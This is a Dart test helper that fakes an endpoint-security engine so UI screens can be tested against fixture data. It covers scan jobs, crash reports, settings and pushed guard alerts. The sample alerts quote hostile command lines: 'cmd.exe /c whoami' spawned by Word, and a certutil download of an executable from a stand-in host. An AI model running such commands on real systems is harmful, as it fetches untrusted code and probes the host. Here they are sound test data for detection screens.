// The other half of the contract: a fake engine that answers the way
// `qa/methods.json` says the real one does, so a widget test and the contract
// harness describe the same surface.
//
// It is deliberately not a mock framework. The point is that a screen test can
// be written without inventing a reply: the shape comes from the registry, the
// interesting content comes from `qa/ui/fixtures.json`, and anything else is an
// error the test will see rather than a silent `null`.
//
// Stateful methods are simulated only where a screen's behaviour depends on it:
// settings (a language that can be read back), the job table (a scan that can be
// watched to completion and then listed), the crash table (a report that can be
// opened and deleted), and the two push streams.

import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:mics_app/core/ipc/ipc_client.dart';

/// One thing the UI asked for, in order.
class Call {
  Call(this.method, this.params);

  final String method;
  final Map<String, dynamic>? params;

  @override
  String toString() => params == null ? method : '$method $params';
}

class FakeEngine extends EngineIpc {
  FakeEngine({Map<String, dynamic>? fixtures})
      : _fixtures = fixtures ?? _loadFixtures(),
        _shapes = _loadRegistry().shapes,
        _known = _loadRegistry().methods;

  final Map<String, dynamic> _fixtures;
  final Map<String, String> _shapes;

  /// Every method the dispatcher has, whether or not the registry pins a shape
  /// for it. A method that exists but has no registered shape (a mutation, a
  /// network call) still answers `{}` rather than failing the screen.
  final Set<String> _known;

  /// Everything the UI asked for, in order.
  final List<Call> calls = [];

  /// Methods the screen asked for that neither the fixtures nor the registry
  /// could answer. A non-empty list after a test is a hole in the harness.
  final List<String> unanswerable = [];

  final _events = StreamController<Map<String, dynamic>>.broadcast();
  final _progress = StreamController<Map<String, dynamic>>.broadcast();

  String _lang = 'en';
  final Map<String, Map<String, dynamic>> _jobs = {};
  int _jobSeq = 0;
  bool scanRunning = false;

  @override
  Stream<Map<String, dynamic>> get eventStream => _events.stream;

  @override
  Stream<Map<String, dynamic>> get progressStream => _progress.stream;

  @override
  EngineState get state => EngineState.running;

  @override
  Stream<EngineState> get statusStream => const Stream.empty();

  @override
  Future<bool> ensureRunning() async => true;

  @override
  String resolveEnginePath() => 'fake-engine.exe';

  @override
  void dispose() {
    _events.close();
    _progress.close();
  }

  /// Pushes an engine notification into the screen, the way the real pipe does:
  /// `EngineIpc` unwraps the JSON-RPC envelope and hands the screen the raw
  /// `params`, so that is what a screen's listener expects.
  void emitEvent(Map<String, dynamic> params) => _events.add(params);

  void emitProgress(Map<String, dynamic> params) => _progress.add(params);

  /// The steady state of a machine that has been running for a while: one
  /// guard alert in the last few minutes, so a screen that only shows pushed
  /// traffic has something to show. Called once, before the first sweep.
  void goLive() {
    emitEvent({
      'type': 'guard_alert',
      'severity': 'high',
      'rule_id': 'guard-002',
      'rule_name': 'Office spawning a shell',
      'pid': 4242,
      'process': 'WINWORD.EXE',
      'detail': 'WINWORD.EXE spawned cmd.exe /c whoami',
      'at': 1793313000,
    });
  }

  /// A guard event whose dismissal count crossed the mute threshold, so the
  /// "mute this category?" offer has a reason to appear.
  void emitDismissableAlert() {
    emitEvent({
      'type': 'guard_alert',
      'severity': 'medium',
      'rule_id': 'guard-003',
      'rule_name': 'LOLBin download',
      'pid': 5150,
      'process': 'certutil.exe',
      'detail': 'certutil.exe -urlcache -f http://example.invalid/a.exe',
      'at': 1793313120,
    });
  }

  List<String> get calledMethods => calls.map((c) => c.method).toList();

  bool called(String method) => calledMethods.contains(method);

  int count(String method) => calledMethods.where((m) => m == method).length;

  Map<String, dynamic>? lastParams(String method) {
    for (final call in calls.reversed) {
      if (call.method == method) return call.params;
    }
    return null;
  }

  @override
  Future<dynamic> request(String method,
      [Map<String, dynamic>? params,
      Duration timeout = const Duration(seconds: 120)]) async {
    calls.add(Call(method, params));
    final stateful = _stateful(method, params);
    if (stateful != null) return stateful;

    final fixed = _fixtures[method];
    if (fixed != null) return _deepCopy(fixed);

    final shape = _shapes[method];
    switch (shape) {
      case 'object':
        return <String, dynamic>{};
      case 'array':
        return <dynamic>[];
      case 'string':
        return '';
      case 'any':
        return null;
      case 'error':
        throw EngineException('$method refused (registry says error)');
      default:
        // A method the dispatcher has but the registry does not pin a shape for
        // (a mutation, a network call): `{}` is the only safe guess, and a
        // screen that reads a field out of it will say so loudly.
        if (_known.contains(method)) return <String, dynamic>{};
        unanswerable.add(method);
        throw EngineException('no fixture and no registry row for $method');
    }
  }

  /// The handful of methods whose answer depends on what came before.
  dynamic _stateful(String method, Map<String, dynamic>? params) {
    switch (method) {
      case 'settings.get':
        return {'lang': _lang};
      case 'settings.set':
        final next = params?['lang'];
        if (next is String) _lang = next;
        return {'status': 'ok', 'lang': _lang};
      case 'scan.start':
        return _startJob('scan', params);
      case 'vuln.scan.start':
        return _startJob('vuln_scan', params);
      case 'scan.stop':
        final wasRunning = scanRunning;
        scanRunning = false;
        for (final job in _jobs.values) {
          if (job['state'] == 'running') job['state'] = 'stopped';
        }
        return {'stopped': wasRunning};
      case 'job.get':
        _seedJobs();
        final id = params?['job_id'];
        final job = id is String ? _jobs[id] : null;
        if (job == null) throw EngineException('no such job: $id');
        return {
          'job': _deepCopy(job),
          'findings': _deepCopy(job['findings'] ?? <dynamic>[]),
          'running': job['state'] == 'running',
        };
      case 'job.list':
        _seedJobs();
        return _jobs.values.map((j) => _deepCopy(_withoutFindings(j))).toList();
      case 'job.cancel':
        final id = params?['job_id'];
        final job = id is String ? _jobs[id] : null;
        if (job == null || job['state'] != 'running') return {'cancelled': false};
        job['state'] = 'cancelled';
        scanRunning = false;
        return {'cancelled': true};
      case 'crash.list':
        _seedCrash();
        final rows = _crash.values
            .map((row) => _deepCopy(row) as Map<String, dynamic>)
            .toList()
          // The engine answers newest last-seen first.
          ..sort((a, b) =>
              '${b['last_seen']}'.compareTo('${a['last_seen']}'));
        final limit = params?['limit'];
        return limit is int && limit > 0 && rows.length > limit
            ? rows.sublist(0, limit)
            : rows;
      case 'crash.get':
        _seedCrash();
        final id = params?['bug_id'];
        final summary = id is String ? _crash[id] : null;
        if (summary == null) throw EngineException('no such report: $id');
        // The engine answers the report that was asked for: the list row wins
        // for the fields both shapes carry, and the fixture supplies what only
        // the full report has (version, session, log tail).
        final template =
            (_fixtures['crash.get'] as Map?)?.cast<String, dynamic>() ?? const {};
        return _deepCopy({...template, ...summary});
      case 'crash.delete':
        _seedCrash();
        final id = params?['bug_id'];
        // The real dispatcher refuses a malformed id and answers `false` for a
        // well-formed one that is not there (idempotent, like job.cancel).
        if (id is! String || !_bugId.hasMatch(id)) {
          throw EngineException('not a bug id: $id');
        }
        return {'deleted': _crash.remove(id) != null, 'bug_id': id};
    }
    return null;
  }

  static final _bugId = RegExp(r'^MICS-\d{8}-[0-9a-f]{6}$');

  final Map<String, Map<String, dynamic>> _crash = {};
  bool _crashSeeded = false;

  /// The engine already has history before the screen opens: `crash.list` is a
  /// query, not an action, so it starts from the fixture - and `crash.delete`
  /// removes from this table, so a screen that re-reads the list sees the
  /// report it deleted gone.
  void _seedCrash() {
    if (_crashSeeded) return;
    _crashSeeded = true;
    final seeded = _fixtures['crash.list'];
    if (seeded is! List) return;
    for (final row in seeded) {
      final report = (row as Map).cast<String, dynamic>();
      _crash[report['bug_id'] as String] = report;
    }
  }

  /// `scan.start` and `vuln.scan.start` differ only in `kind`: the screens
  /// filter `job.list` on it, so the fake has to set it.
  Map<String, dynamic> _startJob(String kind, Map<String, dynamic>? params) {
    final id = '$kind-qa-${++_jobSeq}';
    scanRunning = true;
    _jobs[id] = {
      'job_id': id,
      'kind': kind,
      'state': 'running',
      'path': params?['path'] ?? 'C:/qa',
      'root': params?['path'] ?? 'C:/qa',
      'quarantine': params?['quarantine'] ?? false,
      'total': 120,
      'processed': 0,
      'scanned': 0,
      'skipped': 0,
      'findings_count': 0,
      'duration_ms': 0,
      'stopped': false,
      'findings': <dynamic>[],
    };
    return {'job_id': id, 'state': 'running', 'kind': kind};
  }

  static Map<String, dynamic> _withoutFindings(Map<String, dynamic> job) {
    final copy = _deepCopy(job) as Map<String, dynamic>;
    copy.remove('findings');
    return copy;
  }

  bool _jobsSeeded = false;

  /// The machine already has history before the screen opens: `job.list` is a
  /// query, not an action, so it starts from the fixture and grows from there.
  void _seedJobs() {
    if (_jobsSeeded) return;
    _jobsSeeded = true;
    final seeded = _fixtures['job.list'];
    if (seeded is! List) return;
    for (final row in seeded) {
      final job = (row as Map).cast<String, dynamic>();
      _jobs[job['job_id'] as String] = job;
    }
  }

  /// Lets a test move the fake forward the way the engine would: finish the
  /// scan it was told to start, with findings, then tell the screen about it.
  void finishRunningScan({int findings = 2}) {
    for (final job in _jobs.values) {
      if (job['state'] != 'running') continue;
      job['state'] = 'done';
      job['processed'] = job['total'];
      job['scanned'] = (job['total'] as int) - 2;
      job['skipped'] = 2;
      job['duration_ms'] = 1234;
      job['findings_count'] = findings;
      job['findings'] = [
        for (var i = 0; i < findings; i++)
          {
            'path': 'C:/Users/qa/Downloads/sample$i.exe',
            'sha256': 'f' * 64,
            'reason': 'YARA: Suspicious_Packer',
            'severity': 'high',
          }
      ];
      scanRunning = false;
      emitEvent({
        'type': 'job_finished',
        'data': {'job_id': job['job_id']},
      });
    }
  }

  static dynamic _deepCopy(Object? value) => jsonDecode(jsonEncode(value));

  static Map<String, dynamic> _loadFixtures() {
    final file = File('qa/ui/fixtures.json');
    if (!file.existsSync()) return const {};
    final decoded = jsonDecode(file.readAsStringSync()) as Map<String, dynamic>;
    return (decoded['methods'] as Map).cast<String, dynamic>();
  }

  /// The two facts the fake needs from the contract registry: what shape each
  /// method answers with, and which methods exist at all.
  static ({Map<String, String> shapes, Set<String> methods}) _loadRegistry() {
    final file = File('qa/methods.json');
    final decoded = jsonDecode(file.readAsStringSync()) as Map<String, dynamic>;
    final shapes = <String, String>{};
    final methods = <String>{};
    for (final row in decoded['methods'] as List) {
      final map = (row as Map).cast<String, dynamic>();
      final method = map['method'] as String;
      methods.add(method);
      final expect = map['expect'] as String?;
      if (expect != null) shapes[method] = expect;
    }
    return (shapes: shapes, methods: methods);
  }
}